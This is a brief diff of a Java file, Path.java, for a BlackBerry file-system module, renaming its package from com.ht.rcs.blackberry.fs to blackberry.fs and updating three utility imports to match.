@@ -5,7 +5,7 @@
  * File         : Path.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.fs;
+package blackberry.fs;
 
 import java.io.IOException;
 import java.util.Enumeration;
@@ -15,9 +15,9 @@ import javax.microedition.io.Connector;
 import javax.microedition.io.file.FileConnection;
 import javax.microedition.io.file.FileSystemRegistry;
 
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 /**
  * The Class Path.
